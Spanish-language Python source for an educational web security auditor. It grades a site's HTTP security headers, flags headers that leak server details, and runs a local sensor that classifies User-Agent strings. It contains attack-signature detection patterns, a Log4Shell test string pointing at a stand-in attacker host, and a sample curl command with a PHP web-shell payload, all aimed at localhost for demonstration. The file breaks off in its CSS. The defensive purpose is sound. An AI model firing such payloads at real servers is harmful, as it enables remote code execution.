#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import html
import json
import re
import socket
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.rule import Rule
from rich.prompt import Prompt, Confirm
from rich.markup import escape as rich_escape
from rich import box

# Consola principal para la interacción en pantalla
console = Console()

# Almacén en memoria de las peticiones capturadas por el servidor
CAPTURAS_SESION = []

# Acumuladores que alimentan el informe HTML (resumen global + secciones por apartado)
RESUMEN = {}
SECCIONES = []

BANNER = """[bold magenta]
  ██╗  ██╗███████╗ █████╗ ██████╗ ███████╗██████╗ ███████╗    ██╗   ██╗ █████╗
  ██║  ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝    ██║   ██║██╔══██╗
  ███████║█████╗  ███████║██║  ██║█████╗  ██████╔╝███████╗    ██║   ██║███████║
  ██╔══██║██╔══╝  ██╔══██║██║  ██║██╔══╝  ██╔══██╗╚════██║    ██║   ██║██╔══██║
  ██║  ██║███████╗██║  ██║██████╔╝███████╗██║  ██║███████║    ╚██████╔╝██║  ██║
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝
[/bold magenta][dim]  v3.0 | Auditor de Cabeceras Web y Sensor HTTP de User-Agent (Informe Amigable)[/dim]
"""

# Diccionario de Cabeceras de Seguridad explicado para personas no expertas
CABECERAS_SEGURIDAD = {
    "Strict-Transport-Security": {
        "nombre_amigable": "🔒 Candado HTTPS Obligatorio (HSTS)",
        "importancia": "🔴 ALTA",
        "explicacion_presente": "Obliga al navegador a conectarse siempre con cifrado seguro (candado), impidiendo que espías intercepten la conexión en redes Wi-Fi públicas.",
        "explicacion_ausente": "Si un usuario entra sin escribir 'https://', un atacante en su misma red podría interceptar la comunicación antes de que se active el candado."
    },
    "Content-Security-Policy": {
        "nombre_amigable": "🛡️ Lista de Invitados Permitidos (CSP)",
        "importancia": "🔴 ALTA",
        "explicacion_presente": "Controla qué imágenes, scripts y archivos externos pueden cargarse en la web, bloqueando la inyección de código malicioso (ataques XSS).",
        "explicacion_ausente": "La web no restringe de dónde se cargan sus recursos, facilitando que un atacante pueda inyectar scripts falsos para robar datos."
    },
    "X-Frame-Options": {
        "nombre_amigable": "🖼️ Escudo Anti-Superposición (Clickjacking)",
        "importancia": "🟡 MEDIA",
        "explicacion_presente": "Impide que otra página web maliciosa incruste esta web dentro de un marco invisible para engañar al usuario al hacer clic.",
        "explicacion_ausente": "Un estafador podría meter esta web dentro de otra página falsa como si fuera un calco transparente para robar clics (Clickjacking)."
    },
    "X-Content-Type-Options": {
        "nombre_amigable": "📄 Verificador de Tipo de Archivo (No-Sniff)",
        "importancia": "🟡 MEDIA",
        "explicacion_presente": "Obliga al navegador a respetar el formato real de los archivos (que una foto sea solo una foto y no un programa camuflado).",
        "explicacion_ausente": "El navegador podría intentar adivinar el tipo de un archivo subido y ejecutar código oculto dentro de una supuesta imagen."
    },
    "Referrer-Policy": {
        "nombre_amigable": "🕵️ Privacidad de Procedencia (Referrer)",
        "importancia": "🟢 BAJA",
        "explicacion_presente": "Protege la privacidad del visitante para que, al pulsar un enlace hacia otra web, no se filtre de qué página interna venía.",
        "explicacion_ausente": "Al hacer clic en enlaces externos, el navegador puede revelar a terceros la dirección exacta que el usuario estaba leyendo."
    },
    "Permissions-Policy": {
        "nombre_amigable": "🎙️ Control de Cámara, Micrófono y GPS",
        "importancia": "🟢 BAJA",
        "explicacion_presente": "Bloquea por defecto que complementos externos dentro de la web puedan pedir acceso a la cámara, micrófono o ubicación.",
        "explicacion_ausente": "No se limitan expresamente las funciones físicas del dispositivo (cámara, micro, geolocalización) mediante cabeceras."
    },
    "Cross-Origin-Opener-Policy": {
        "nombre_amigable": "🚧 Aislamiento entre Pestañas (COOP)",
        "importancia": "🟢 BAJA",
        "explicacion_presente": "Aísla la pestaña del navegador para que otras páginas abiertas al mismo tiempo no puedan espiar su memoria.",
        "explicacion_ausente": "Las ventanas emergentes abiertas desde la web comparten contexto con la pestaña principal."
    }
}

# Cabeceras que revelan información interna (Information Disclosure)
CABECERAS_CHIVATAS = {
    "Server": ("Marca y modelo del Servidor Web", "Indica qué programa atiende la web (ej. Apache, Nginx, IIS). Si muestra el número de versión, facilita buscar fallos exactos."),
    "X-Powered-By": ("Motor o Lenguaje de Programación", "Revela con qué tecnología interna está programada la web (ej. PHP/8.1, Express, ASP.NET). Se recomienda ocultarla."),
    "X-AspNet-Version": ("Versión exacta de Microsoft .NET", "Detalla la versión interna del motor de Microsoft; innecesario para el visitante y útil para un atacante."),
    "X-Generator": ("Plataforma de Creación Web", "Delata qué gestor de contenidos generó la página (ej. WordPress, Drupal, Joomla).")
}


def _peso(importancia):
    """Peso de una cabecera según su importancia (para la nota ponderada)."""
    if "ALTA" in importancia:
        return 3
    if "MEDIA" in importancia:
        return 2
    return 1


def reset_acumuladores():
    SECCIONES.clear()
    CAPTURAS_SESION.clear()
    RESUMEN.clear()
    RESUMEN.update({
        "url": None,
        "escudos_presentes": 0,
        "escudos_total": len(CABECERAS_SEGURIDAD),
        "score": 0,            # 0-100 ponderado por importancia
        "nota_letra": "—",
        "clave": "ok",         # ok | warn | crit
        "faltan": [],          # [(nombre, importancia, explicacion_ausente)]
        "fugas": [],           # [(titulo, valor)]
        "servidor": None,
        "visitas": 0,
        "sospechosas": 0,
    })


def registrar_seccion(num, nombre, estado, nota=None, hir=None, tabla=None):
    SECCIONES.append({
        "id": num, "nombre": nombre, "estado": estado,
        "nota": nota, "hir": hir, "tabla": tabla, "incluir": True,
    })


def mostrar_explicacion_amigable(titulo, analogia, que_buscamos):
    """Genera un panel didáctico pensado para lectores sin conocimientos técnicos."""
    texto = (
        f"[bold cyan]💡 ¿Qué es esto en lenguaje sencillo?[/bold cyan]\n"
        f"{analogia}\n\n"
        f"[bold yellow]🎯 ¿Por qué es importante para la seguridad?[/bold yellow]\n"
        f"{que_buscamos}"
    )
    return Panel(texto, title=f"[bold]{titulo}[/bold]", border_style="bright_blue", box=box.ROUNDED)


def validar_antes_de_ejecutar(info_modulo, interactivo=True):
    console.print(Rule(f"[bold magenta]Apartado {info_modulo['id']}: {info_modulo['nombre']}[/bold magenta]"))
    console.print(f"  [green]✔ Pre-validación técnica:[/green] {info_modulo['requisitos']}")
    if interactivo:
        return Confirm.ask(f"  ¿Ejecutar ahora [bold]{info_modulo['nombre']}[/bold]?", default=True)
    return True


def validar_despues_de_ejecutar(bloques_renderizados, nombre_modulo, interactivo=True):
    for bloque in bloques_renderizados:
        console.print(bloque)
    guardar = True
    if interactivo:
        console.print()
        guardar = Confirm.ask(
            f"  [bold magenta]📋 Validación del apartado:[/bold magenta] ¿Dar por válido [bold]{nombre_modulo}[/bold] y guardarlo en el informe HTML?",
            default=True
        )
    if guardar:
        console.print(f"  [green]✔ Apartado '{nombre_modulo}' validado y añadido al informe.[/green]\n")
    else:
        console.print(f"  [yellow]⏭ Apartado '{nombre_modulo}' descartado del informe final.[/yellow]\n")
    return guardar


# ==============================================================================
# MÓDULO 1: AUDITORÍA DE CABECERAS DE SEGURIDAD (OWASP) — NOTA PONDERADA
# ==============================================================================

def mod_cabeceras_seguridad(url, port=8080, interactivo=True):
    bloques = [
        Rule("[bold blue]1. Escudos de Seguridad de la Página Web (Cabeceras HTTP)[/bold blue]"),
        mostrar_explicacion_amigable(
            "1. Cabeceras de Seguridad Web",
            "Cuando abres una página web, antes de enseñarte las fotos y el texto, el servidor le entrega a tu navegador una hoja invisible de normas de seguridad (las cabeceras HTTP). Son como las medidas de seguridad de un banco: cristales blindados, cámaras y detectores de metales.",
            "Comprobamos cuáles de los 7 escudos recomendados (estándar OWASP) están activados y cuáles faltan, calificando la web de la 'A' (sobresaliente) a la 'F' (suspenso). La nota se pondera: pesa más que falte un escudo de importancia ALTA que uno de importancia BAJA."
        )
    ]

    filas_rep = []
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0 (Security-Header-Auditor/3.0)"})
        headers = r.headers

        table = Table(title=f"Estado de los Escudos de Seguridad en {url}", box=box.ROUNDED, show_lines=True)
        table.add_column("Escudo / Medida de Protección", style="bold cyan", no_wrap=True)
        table.add_column("¿Está Activo?", justify="center")
        table.add_column("Importancia", justify="center")
        table.add_column("Explicación en Lenguaje Sencillo", style="white")

        presentes = 0
        total = len(CABECERAS_SEGURIDAD)
        peso_total = sum(_peso(i["importancia"]) for i in CABECERAS_SEGURIDAD.values())
        peso_presente = 0
        faltan = []

        for clave_http, info in CABECERAS_SEGURIDAD.items():
            valor = headers.get(clave_http)
            if valor:
                presentes += 1
                peso_presente += _peso(info["importancia"])
                estado = "[bold green]🟢 ACTIVO[/bold green]"
                explicacion = f"[green]{info['explicacion_presente']}[/green]\n[dim]Configuración técnica: {valor[:90]}[/dim]"
                estado_rep = "🟢 Activo"
            else:
                estado = "[bold red]🔴 FALTA[/bold red]"
                explicacion = f"[yellow]{info['explicacion_ausente']}[/yellow]\n[dim]Cabecera ausente: {clave_http}[/dim]"
                estado_rep = "🔴 Falta"
                faltan.append((info["nombre_amigable"], info["importancia"], info["explicacion_ausente"]))

            table.add_row(info["nombre_amigable"], estado, info["importancia"], explicacion)
            filas_rep.append([info["nombre_amigable"], estado_rep, info["importancia"]])

        bloques.append(table)

        score = peso_presente / peso_total if peso_total else 0
        if score >= 0.85:
            letra, clave = "A", "ok"
        elif score >= 0.65:
            letra, clave = "B", "ok"
        elif score >= 0.45:
            letra, clave = "C", "warn"
        elif score >= 0.25:
            letra, clave = "D", "warn"
        else:
            letra, clave = "F", "crit"

        textos = {
            "A": "🟢 [bold green]NOTA A (Sobresaliente):[/bold green] prácticamente todos los escudos modernos activos.",
            "B": "🟢 [bold cyan]NOTA B (Notable):[/bold cyan] buena protección general, faltan ajustes menores.",
            "C": "🟡 [bold yellow]NOTA C (Aprobado):[/bold yellow] protecciones básicas, descuida escudos importantes.",
            "D": "🟡 [bold yellow]NOTA D (Justo):[/bold yellow] faltan escudos de peso.",
            "F": "🔴 [bold red]NOTA F (Suspenso):[/bold red] la web apenas envía órdenes de protección al navegador.",
        }
        color_borde = {"ok": "green", "warn": "yellow", "crit": "red"}[clave]
        bloques.append(Panel(
            f"[bold]Escudos detectados:[/bold] {presentes} de {total} (puntuación ponderada: {int(score*100)}/100)\n{textos[letra]}",
            title="Calificación Global de Cabeceras", border_style=color_borde
        ))

        RESUMEN.update({
            "escudos_presentes": presentes, "escudos_total": total,
            "score": int(score * 100), "nota_letra": letra, "clave": clave,
            "faltan": faltan,
        })
        registrar_seccion(1, "Cabeceras de seguridad (OWASP)", clave,
                          tabla={"cols": ["Escudo", "Estado", "Importancia"], "filas": filas_rep})

    except Exception as e:
        bloques.append(Panel(f"[bold red]No se pudo conectar con {url} para revisar sus cabeceras:[/bold red] {e}", border_style="red"))
        registrar_seccion(1, "Cabeceras de seguridad (OWASP)", "info",
                          nota=f"No se pudo conectar con {url}: {e}")

    return bloques


# ==============================================================================
# MÓDULO 2: DETECCIÓN DE FUGAS DE INFORMACIÓN (BANNER GRABBING PASIVO)
# ==============================================================================

def mod_fuga_informacion(url, port=8080, interactivo=True):
    bloques = [
        Rule("[bold blue]2. Huellas y Fugas de Información Técnica (Information Disclosure)[/bold blue]"),
        mostrar_explicacion_amigable(
            "2. ¿El servidor habla más de la cuenta?",
            "Por defecto, muchos servidores web saludan diciendo exactamente qué programa y qué versión utilizan (por ejemplo: 'Hola, soy un servidor Apache versión 2.4.49'). Es como poner una pegatina en la puerta de casa indicando la marca y el año exacto de fabricación de tu cerradura.",
            "Lo ideal por seguridad es que el servidor sea discreto y no revele sus versiones internas para no dar pistas gratis a los atacantes."
        )
    ]

    filas_rep = []
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0 (Security-Header-Auditor/3.0)"})
        headers = r.headers
        RESUMEN["servidor"] = headers.get("Server")

        table = Table(title=f"Análisis de Discreción del Servidor ({url})", box=box.ROUNDED, show_lines=True)
        table.add_column("Dato Técnico Buscado", style="cyan")
        table.add_column("¿Qué revela la web?", style="bold yellow")
        table.add_column("¿Qué significa para el usuario?", style="white")

        fugas = []
        for cab, (titulo, desc) in CABECERAS_CHIVATAS.items():
            if cab in headers:
                fugas.append((titulo, headers[cab]))
                table.add_row(f"{titulo} ({cab})", f"⚠️ Expuesto: '{headers[cab]}'", desc)
                filas_rep.append([f"{titulo} ({cab})", f"⚠️ Expuesto: {headers[cab]}", desc])
            else:
                table.add_row(f"{titulo} ({cab})", "🟢 Oculto (Correcto)", "El servidor oculta este dato técnico correctamente.")
                filas_rep.append([f"{titulo} ({cab})", "🟢 Oculto", "Correcto: el servidor no revela este dato."])

        bloques.append(table)
        RESUMEN["fugas"] = fugas

        if not fugas:
            bloques.append(Panel("🟢 [bold green]CONCLUSIÓN:[/bold green] Excelente discreción. El servidor no filtra marcas ni versiones internas en sus cabeceras.", border_style="green"))
        else:
            bloques.append(Panel(f"🟡 [bold yellow]CONCLUSIÓN:[/bold yellow] Se han detectado {len(fugas)} cabecera(s) que dan pistas sobre la tecnología interna del servidor. Se aconseja ocultarlas en la configuración.", border_style="yellow"))

        registrar_seccion(2, "Fugas de información del servidor", "warn" if fugas else "ok",
                          tabla={"cols": ["Dato", "Revela", "Significado"], "filas": filas_rep})

    except Exception as e:
        bloques.append(Panel(f"[bold red]Error al comprobar fugas de información:[/bold red] {e}", border_style="red"))
        registrar_seccion(2, "Fugas de información del servidor", "info", nota=f"No se pudo conectar: {e}")

    return bloques


# ==============================================================================
# MÓDULO 3: SERVIDOR HTTP CAPTURADOR Y ANALIZADOR DE USER-AGENT
# ==============================================================================

def clasificar_user_agent(ua):
    """Traduce cualquier cabecera User-Agent a una categoría comprensible y evalúa su peligro."""
    ua_low = ua.lower()

    if "${jndi:" in ua_low:
        return ("🚨 ATAQUE CRÍTICO (Log4Shell)",
                "🔴 PELIGRO EXTREMO: Alguien ha enviado un comando trampa en su tarjeta de visita para intentar tomar el control total del servidor.",
                "bold red")
    if "() {" in ua_low:
        return ("🚨 ATAQUE CRÍTICO (Shellshock)",
                "🔴 PELIGRO EXTREMO: Intento de ejecutar órdenes ocultas en sistemas Linux antiguos a través de la cabecera.",
                "bold red")
    if "<?php" in ua_low or "<script" in ua_low or "' or 1=1" in ua_low:
        return ("🚨 INYECCIÓN DE CÓDIGO (Log Poisoning / XSS / SQLi)",
                "🔴 PELIGRO ALTO: El visitante intenta colar código malicioso en el libro de visitas del servidor para infectar al administrador.",
                "bold red")

    escaneres = {
        "wfuzz": "Wfuzz (Buscador de rutas ocultas)",
        "gobuster": "Gobuster (Fuerza bruta de carpetas)",
        "sqlmap": "SQLMap (Extractor automático de bases de datos)",
        "nikto": "Nikto (Escáner de fallos web)",
        "nmap": "Nmap (Escáner de puertos y redes)",
        "ffuf": "FFUF (Fuzzer web rápido)",
        "nuclei": "Nuclei (Escáner de vulnerabilidades)",
        "hydra": "Hydra (Adivinador de contraseñas)"
    }
    for clave, nombre_herr in escaneres.items():
        if clave in ua_low:
            return (f"⚠️ ESCÁNER DE HACKING ({nombre_herr})",
                    "🟠 ATENCIÓN: No es una persona navegando; es un programa automático de ciberseguridad buscando puntos débiles en la web.",
                    "yellow")

    robots = ["curl", "wget", "python-requests", "urllib", "postman", "go-http-client"]
    for rb in robots:
        if rb in ua_low:
            return (f"🤖 PROGRAMA AUTOMÁTICO ({rb})",
                    "🟡 AVISO: Conexión realizada desde un script programado o desde una terminal de comandos, no desde un navegador convencional.",
                    "cyan")

    dispositivo = "Ordenador o Dispositivo Estándar"
    if "iphone" in ua_low or "ipad" in ua_low:
        dispositivo = "Teléfono iPhone / iPad (iOS)"
    elif "android" in ua_low:
        dispositivo = "Teléfono Móvil Android"
    elif "windows" in ua_low:
        dispositivo = "Ordenador con Windows"
    elif "macintosh" in ua_low or "mac os" in ua_low:
        dispositivo = "Ordenador Mac (Apple)"
    elif "linux" in ua_low:
        dispositivo = "Ordenador con Linux"

    navegador = "Navegador Web"
    if "edg/" in ua_low:
        navegador = "Microsoft Edge"
    elif "chrome/" in ua_low and "edg/" not in ua_low:
        navegador = "Google Chrome"
    elif "firefox/" in ua_low:
        navegador = "Mozilla Firefox"
    elif "safari/" in ua_low and "chrome/" not in ua_low:
        navegador = "Apple Safari"

    return (f"👤 VISITANTE NORMAL ({navegador} en {dispositivo})",
            "🟢 SEGURO: Parece un usuario legítimo visitando la página desde su navegador habitual.",
            "green")


class SensorUserAgentHandler(BaseHTTPRequestHandler):
    log_file = "capturas_user_agent.json"
    # Ocultamos la versión interna (buen ejemplo de discreción; ver módulo 2)
    server_version = "SensorEducativo"
    sys_version = ""

    def log_message(self, format, *args):
        pass  # Silenciar salida sucia por defecto de http.server

    def registrar_visita(self, metodo):
        ua = self.headers.get("User-Agent", "[Sin User-Agent declarado]")
        ip_cliente, puerto_cliente = self.client_address
        hora = datetime.now().strftime("%H:%M:%S")
        tipo_visitante, explicacion_amigable, color = clasificar_user_agent(ua)

        evento = {
            "hora": hora, "ip": ip_cliente, "metodo": metodo, "ruta": self.path,
            "user_agent": ua, "tipo": tipo_visitante,
            "explicacion": explicacion_amigable, "color": color,
        }
        CAPTURAS_SESION.append(evento)
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(evento, ensure_ascii=False) + "\n")
        except OSError:
            pass

        # Alerta en vivo en consola. IMPORTANTE: escapamos el marcado de 'rich'
        # para que un User-Agent malicioso no rompa ni inyecte en la salida.
        console.print(Panel(
            f"• [bold cyan]Hora:[/bold cyan] {hora}   |   [bold cyan]Origen:[/bold cyan] {ip_cliente}:{puerto_cliente}   |   "
            f"[bold cyan]Ruta:[/bold cyan] {rich_escape(metodo)} {rich_escape(self.path)}\n"
            f"• [bold cyan]Tarjeta de visita (User-Agent):[/bold cyan] [bold yellow]{rich_escape(ua)}[/bold yellow]\n"
            f"• [bold cyan]Diagnóstico del Sensor:[/bold cyan] [{color}]{tipo_visitante}[/{color}]\n"
            f"• [bold cyan]Traducción amigable:[/bold cyan] {explicacion_amigable}",
            title="📡 Visita Interceptada en Vivo", border_style=color
        ))

        # Respuesta al visitante. IMPORTANTE: escapamos TODO lo que venga del
        # cliente (ua, ruta) antes de incrustarlo en HTML, para no reflejar XSS.
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        # Ejemplo didáctico: el sensor manda sus propias cabeceras de seguridad
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Content-Security-Policy", "default-src 'none'; style-src 'unsafe-inline'")
        self.send_header("Referrer-Policy", "no-referrer")
        self.end_headers()

        ua_safe = html.escape(ua)
        ruta_safe = html.escape(self.path)
        tipo_safe = html.escape(tipo_visitante)
        expl_safe = html.escape(explicacion_amigable)
        html_respuesta = f"""<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8"><title>Sensor User-Agent Activo</title></head>
<body style="font-family: sans-serif; background: #0f172a; color: #e2e8f0; padding: 2rem;">
  <div style="max-width: 700px; margin: auto; background: #1e293b; padding: 1.5rem; border-radius: 10px; border: 1px solid #38bdf8;">
    <h2 style="color: #38bdf8; margin-top: 0;">📡 Servidor HTTP Capturador de User-Agent</h2>
    <p>Tu petición (<code>{html.escape(self.command)} {ruta_safe}</code>) ha sido registrada y analizada.</p>
    <p><b>Tu User-Agent detectado:</b> <code style="color: #facc15;">{ua_safe}</code></p>
    <p><b>Clasificación:</b> {tipo_safe}</p>
    <p style="color: #94a3b8; font-size: 0.9em;">{expl_safe}</p>
  </div>
</body></html>"""
        self.wfile.write(html_respuesta.encode("utf-8"))

    def do_GET(self):
        self.registrar_visita("GET")

    def do_POST(self):
        self.registrar_visita("POST")


def mod_servidor_user_agent(url_unused, port=8080, interactivo=True, host="127.0.0.1"):
    bloques = [
        Rule("[bold red]3. Servidor HTTP y Captura de 'User-Agent'[/bold red]"),
        mostrar_explicacion_amigable(
            "3. ¿Qué es el Servidor Capturador de User-Agent?",
            "Cada vez que entras en una web, tu navegador presenta una 'tarjeta de visita' llamada User-Agent donde dice: 'Hola, soy Google Chrome desde un ordenador con Windows 11'. Sin embargo, cualquiera puede falsificar esa tarjeta de visita para disfrazarse o para esconder trampas.",
            "Hemos levantado nuestro propio servidor web para leer la tarjeta de visita de todo el que se conecte y distinguir automáticamente entre visitantes reales, programas espía y ataques informáticos."
        )
    ]

    modo = "A"
    if interactivo:
        console.print(Panel(
            "[bold cyan]¿Cómo quieres probar el Servidor HTTP Capturador?[/bold cyan]\n"
            "  • [bold green][A] Modo Demostración Automática (recomendado para el informe):[/bold green]\n"
            "      El script enciende el servidor y se lanza a sí mismo 5 visitas de prueba (un usuario normal, un móvil, un robot, un escáner tipo Wfuzz y un ataque crítico Log4Shell).\n"
            "  • [bold yellow][M] Modo Escucha Manual:[/bold yellow]\n"
            f"      El servidor se queda abierto en [bold]http://{host}:{port}[/bold] esperando a que entres desde el navegador o lances comandos, hasta que pulses [bold]Ctrl+C[/bold].",
            border_style="cyan"
        ))
        modo = Prompt.ask("👉 Elige el modo del servidor", choices=["A", "M", "a", "m"], default="A").upper()

    try:
        servidor = HTTPServer((host, port), SensorUserAgentHandler)
    except OSError as e:
        bloques.append(Panel(
            f"[bold red]No se pudo abrir el servidor en {host}:{port}:[/bold red] {e}\n"
            f"[dim]Probablemente el puerto esté ocupado. Prueba otro con -p (ej. -p 8090).[/dim]",
            border_style="red"
        ))
        registrar_seccion(3, "Servidor HTTP capturador de User-Agent", "info",
                          nota=f"No se pudo abrir el servidor en {host}:{port} ({e}).")
        return bloques

    if modo == "A":
        hilo = threading.Thread(target=servidor.serve_forever, daemon=True)
        hilo.start()
        console.print(f"\n[bold green]✔ Servidor HTTP iniciado en http://{host}:{port}. Lanzando 5 visitas simuladas...[/bold green]\n")
        pruebas = [
            ("/", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"),
            ("/tienda", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"),
            ("/api/datos", "python-requests/2.31.0"),
            ("/admin/config", "Wfuzz/3.1.0"),
            ("/login.php", "${jndi:ldap://atacante.evil.com/exploit_log4shell}"),
        ]
        for ruta, ua_prueba in pruebas:
            time.sleep(0.4)
            try:
                requests.get(f"http://127.0.0.1:{port}{ruta}", headers={"User-Agent": ua_prueba},
                             timeout=5, proxies={"http": None, "https": None})
            except Exception:
                pass
        servidor.shutdown()
        servidor.server_close()
    else:
        console.print(Panel(
            f"[bold green]Servidor escuchando en http://{host}:{port}[/bold green]\n"
            f"Abre esa dirección en tu navegador o lanza pruebas desde otra terminal:\n"
            f"  • [yellow]curl http://{host}:{port}/[/yellow]\n"
            f"  • [yellow]curl -A 'sqlmap/1.8' http://{host}:{port}/admin[/yellow]\n"
            f"  • [yellow]curl -A '<?php system($_GET[\"c\"]); ?>' http://{host}:{port}/[/yellow]\n\n"
            f"[bold magenta]Cuando termines de capturar visitas, pulsa Ctrl+C para continuar y generar el informe.[/bold magenta]",
            title="Modo Manual Activo", border_style="green"
        ))
        try:
            servidor.serve_forever()
        except KeyboardInterrupt:
            console.print("\n[bold yellow]⏹ Servidor detenido por el usuario. Procesando capturas...[/bold yellow]")
            servidor.server_close()

    # Resumen de capturas
    filas_rep = []
    if CAPTURAS_SESION:
        table = Table(title=f"Registro de Visitas y Tarjetas 'User-Agent' (Puerto {port})", box=box.ROUNDED, show_lines=True)
        table.add_column("Hora / Ruta", style="cyan", no_wrap=True)
        table.add_column("User-Agent Capturado", style="yellow", overflow="fold")
        table.add_column("Diagnóstico Automático", style="bold white")
        table.add_column("Explicación para no expertos", style="white")

        peligros = 0
        for cap in CAPTURAS_SESION:
            if "🔴" in cap["explicacion"] or "🟠" in cap["explicacion"]:
                peligros += 1
            table.add_row(
                f"{cap['hora']}\n{rich_escape(cap['metodo'])} {rich_escape(cap['ruta'])}",
                rich_escape(cap["user_agent"]),
                f"[{cap['color']}]{cap['tipo']}[/{cap['color']}]",
                cap["explicacion"]
            )
            filas_rep.append([f"{cap['hora']} · {cap['metodo']} {cap['ruta']}",
                              cap["user_agent"], cap["tipo"]])
        bloques.append(table)

        RESUMEN["visitas"] = len(CAPTURAS_SESION)
        RESUMEN["sospechosas"] = peligros
        if peligros:
            bloques.append(Panel(
                f"🔴 [bold red]CONCLUSIÓN DEL SENSOR:[/bold red] De las {len(CAPTURAS_SESION)} visitas, se han detectado [bold]{peligros} intentos sospechosos o de ataque[/bold] camuflados en el User-Agent.",
                border_style="red"))
        else:
            bloques.append(Panel(
                f"🟢 [bold green]CONCLUSIÓN DEL SENSOR:[/bold green] Se han registrado {len(CAPTURAS_SESION)} visitas normales sin ataques detectados.",
                border_style="green"))

        registrar_seccion(3, "Servidor HTTP capturador de User-Agent",
                          "crit" if peligros else "ok",
                          nota=f"{len(CAPTURAS_SESION)} visitas capturadas; {peligros} sospechosas o de ataque.",
                          tabla={"cols": ["Hora / Ruta", "User-Agent", "Diagnóstico"], "filas": filas_rep})
    else:
        bloques.append(Panel("🟡 No se registraron visitas durante el tiempo de escucha.", border_style="yellow"))
        registrar_seccion(3, "Servidor HTTP capturador de User-Agent", "info",
                          nota="No se registraron visitas durante el tiempo de escucha.")

    return bloques


# ==============================================================================
# MÓDULO 4: INVESTIGACIÓN SOBRE EL USER-AGENT
# ==============================================================================

def mod_investigacion_ua(url_unused, port=8080, interactivo=True):
    bloques = [
        Rule("[bold blue]4. Investigación: ¿Qué se puede hacer con el 'User-Agent' a grandes rasgos?[/bold blue]"),
        mostrar_explicacion_amigable(
            "4. El poder (y los límites) del User-Agent",
            "El User-Agent nació para algo útil: que la web sepa si le hablas desde un móvil o un ordenador y te enseñe el diseño adecuado. Pero como lo escribe el propio visitante y nadie comprueba si dice la verdad, sirve tanto para usos legítimos como para que atacantes y defensores lo aprovechen.",
            "Esta tabla resume los usos principales, desde los cotidianos hasta los ofensivos y defensivos."
        )
    ]

    table = Table(title="Guía Práctica: ¿para qué se usa y se manipula el User-Agent?", box=box.ROUNDED, show_lines=True)
    table.add_column("Ámbito", style="bold cyan", no_wrap=True)
    table.add_column("Técnica / Uso", style="bold yellow")
    table.add_column("Explicación Sencilla (con ejemplos reales)", style="white")

    usos = [
        ("🌐 Legítimo\n(Web normal)",
         "0. Usos cotidianos",
         "Su función original: servir la versión móvil o de escritorio correcta, medir analítica de visitas y detectar navegadores incompatibles. La inmensa mayoría de las veces el User-Agent se usa para esto, sin nada malicioso."),
        ("🗡️ Ofensivo\n(Atacantes)",
         "1. Disfrazarse para burlar bloqueos\n(User-Agent Spoofing)",
         "Programas como Wfuzz o SQLMap llevan su nombre escrito en el User-Agent y los escudos web los bloquean al instante. Si el atacante lo cambia por el de 'Google Chrome' o el robot de Google ('Googlebot'), pasa desapercibido."),
        ("🗡️ Ofensivo\n(Atacantes)",
         "2. Entrar por versiones menos protegidas\n(Bypass de superficie)",
         "Algunas webs muestran una versión distinta y menos protegida si creen que te conectas desde un iPhone, una Smart TV o la app oficial del banco."),
        ("🗡️ Ofensivo\n(Atacantes)",
         "3. Envenenar el libro de visitas\n(Log Poisoning / Log4Shell / XSS)",
         "Como el servidor anota el User-Agent en un registro o lo muestra a un administrador, un atacante puede escribir código malicioso en vez de su navegador. Así funcionó el fallo mundial 'Log4Shell'."),
        ("🗡️ Ofensivo\n(Red Team)",
         "4. Santo y seña para malware\n(Filtrado C2)",
         "Los virus avanzados hablan con el servidor del atacante usando un User-Agent concreto como contraseña. Si un investigador entra con un navegador normal, el servidor finge ser una página inofensiva."),
        ("🛡️ Defensivo\n(Inteligencia)",
         "5. Radiografía del objetivo\n(Fingerprinting con enlaces trampa)",
         "Si envías un enlace controlado a un sospechoso y lo abre, su User-Agent te revela qué teléfono u ordenador usa y si su sistema operativo está sin actualizar."),
        ("🛡️ Defensivo\n(Blue Team)",
         "6. Caza de bots mentirosos\n(Detección de anomalías / JA3)",
         "Los defensores comparan el User-Agent con la forma real en que se conecta el programa (huella TLS). Si alguien dice ser 'Safari de iPhone' pero su conexión técnica es de un script en Python, se le bloquea en el acto."),
    ]
    for ambito, tecnica, explicacion in usos:
        table.add_row(ambito, tecnica, explicacion)
    bloques.append(table)

    nota_ch = ("ℹ️ [bold]Dato actual:[/bold] por abuso en el rastreo de usuarios, los navegadores modernos están "
               "[bold]reduciendo[/bold] el User-Agent (User-Agent Reduction) y sustituyéndolo poco a poco por los "
               "[bold]Client Hints[/bold], cabeceras donde la web pide solo los datos concretos que necesita.")
    bloques.append(Panel(nota_ch, border_style="cyan"))

    filas_rep = [[a.replace("\n", " "), t.replace("\n", " "), e] for a, t, e in usos]
    registrar_seccion(4, "Investigación: usos del User-Agent", "info",
                      nota="Los navegadores modernos están reduciendo el User-Agent y sustituyéndolo por Client Hints "
                           "(la web pide solo los datos concretos que necesita), por el abuso en el rastreo de usuarios.",
                      tabla={"cols": ["Ámbito", "Técnica / Uso", "Explicación"], "filas": filas_rep})
    return bloques


# ==============================================================================
# GENERADOR DEL INFORME HTML (mismo diseño que los informes de reconocimiento)
# ==============================================================================

_INFORME_CSS = """
*{box-sizing:border-box}
html,body{margin:0}
:root{color-scheme:light;
  --bg:#f4f6f8; --surface:#ffffff; --surface-2:#eef1f5;
  --fg:#1a2230; --muted:#5b6676; --line:#dde3ea;
  --accent:#7c3aed; --accent-soft:#ede9fe;
  --ok:#15803d; --ok-bg:#dcfce7; --ok-line:#86efac;
